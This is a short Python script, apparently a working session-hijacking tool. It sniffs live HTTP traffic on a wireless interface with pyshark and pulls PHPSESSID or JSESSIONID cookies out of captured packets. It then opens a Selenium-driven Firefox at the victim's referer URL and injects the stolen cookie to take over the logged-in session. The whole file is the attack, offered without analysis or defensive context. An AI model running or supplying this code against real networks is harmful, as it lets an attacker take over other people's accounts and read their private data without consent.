import pyshark
from selenium import webdriver

cookie = {"name": "", "value": ""}


def createCookie(cookies):
    for c in cookies.split(";"):
        cookielst = c.strip().split("=")
        if cookielst[0] == "PHPSESSID" or cookielst[0] == "JSESSIONID":
            cookie["name"], cookie["value"] = cookielst[0], cookielst[1]


def hijack():
    capture = pyshark.LiveCapture(interface="wlo1", display_filter="http.cookie || http.cookie_pair")

    for packet in capture.sniff_continuously():
        try:
            createCookie(packet.http.cookie)
            browser = webdriver.Firefox()
            browser.get(packet.http.referer)
            browser.add_cookie(cookie)
            browser.refresh()
            break
        except Exception:
            continue


if __name__ == "__main__":
    hijack()
